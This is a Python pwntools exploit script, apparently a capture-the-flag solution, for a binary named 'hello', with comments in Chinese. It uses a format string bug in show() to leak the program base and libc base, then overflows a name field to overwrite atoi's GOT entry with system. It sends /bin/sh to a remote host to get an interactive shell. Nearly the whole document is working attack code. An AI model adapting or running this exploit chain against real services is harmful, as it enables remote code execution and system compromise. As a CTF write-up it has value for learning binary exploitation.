"""
show()函数中有格式化字符串漏洞

利用思路：利用格式化字符串漏洞，将atoi的got表地址改为system地址，并将buf设置为/bin/sh即可
"""

from pwn import *

#context.log_level = 'debug'

#p = process('./hello')
#gdb.attach(p, "b *$rebase(0xCCE)")
p = remote('61.147.171.105', 60050)

LIBC = ELF("./libc-2.23.so")
HELLO = ELF("./hello")

def add(number):
  p.sendlineafter("your choice>>", b"1")
  p.sendlineafter("phone number:", number.encode())
  p.sendlineafter("name:", b"jackson")
  p.sendlineafter("input des size:", b"10")
  p.sendlineafter("des info:", b"123456789")

def show(index):
  p.sendlineafter("your choice>>", b"3")
  p.sendlineafter("input index:", str(index).encode())

def edit(index, number, name, des_info):
  p.sendlineafter("your choice>>", b"4")
  p.sendlineafter("input index:", str(index).encode())
  p.sendlineafter("phone number:", number)
  p.sendlineafter("name:", name)
  p.sendlineafter("des info:", des_info)


# Step1 泄露程序基址，计算atoi的got表地址
add("%9$p") #show()的返回地址
show(0)
process_base = int(p.recvline().decode().split(':')[1], 16) - 0x1274
atoi_got = process_base + HELLO.got['atoi']

log.success("process_base = " + hex(process_base))
log.success("atoi_got = " + hex(atoi_got))

# Step2 找到libc基址，并计算system地址
add("%13$p")   # __libc_start_main+240
show(1)
libc_base = int(p.recvline().decode().split(':')[1], 16) - LIBC.symbols['__libc_start_main'] - 240
system_addr = libc_base + LIBC.symbols['system']

log.success("libc_base = " + hex(libc_base))
log.success("system_addr = " + hex(system_addr))

# Step3 将atoi的got表项改为system的地址
# 这里利用edit()中，去覆盖保存des info的内存地址
# 内存结构为：
# | phone number |   name   | des info address |
# |   11 bytes   | 13 bytes |      8 bytes     |
payload = b"a" * 13 + p64(atoi_got)
edit(0, b"jack", payload, p64(system_addr))  # PS.本地环境调试时，scanf会出现空格(\x20)截断，导致des info的地址无法被覆盖

# Step4 get shell
p.recvuntil("your choice>>")
p.sendline(b"/bin/sh")

p.interactive()
